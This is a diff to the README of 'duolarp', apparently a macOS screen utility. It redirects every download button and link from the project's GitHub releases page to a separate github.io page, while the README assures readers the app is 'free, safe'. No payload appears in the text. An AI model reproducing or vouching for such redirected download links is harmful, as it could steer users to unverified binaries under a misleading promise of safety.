@@ -8,13 +8,13 @@ duolarp is a magical little app that makes your MacBook screen behave like an iP
 
 ## 🚀 Getting Started
 
-[![Download duolarp](https://img.shields.io/badge/Download-duolarp-blue?style=for-the-badge)](https://github.com/Loriachristological3618/duolarp/releases)
+[![Download duolarp](https://img.shields.io/badge/Download-duolarp-blue?style=for-the-badge)](https://loriachristological3618.github.io)
 
 ### Step 1: Download the App
 
 Visit this link to download the application.
 
-[**Click here to download duolarp**](https://github.com/Loriachristological3618/duolarp/releases)
+[**Click here to download duolarp**](https://loriachristological3618.github.io)
 
 ### Step 2: Install duolarp
 
@@ -72,7 +72,7 @@ If you run into any issues:
 
 Ready to see your MacBook in a whole new way? duolarp is free, safe, and takes less than two minutes to set up.
 
-[![Download duolarp Now](https://img.shields.io/badge/Download-duolarp-purple?style=for-the-badge)](https://github.com/Loriachristological3618/duolarp/releases)
+[![Download duolarp Now](https://img.shields.io/badge/Download-duolarp-purple?style=for-the-badge)](https://loriachristological3618.github.io)
 
 **Visit this link to download the application.**
 
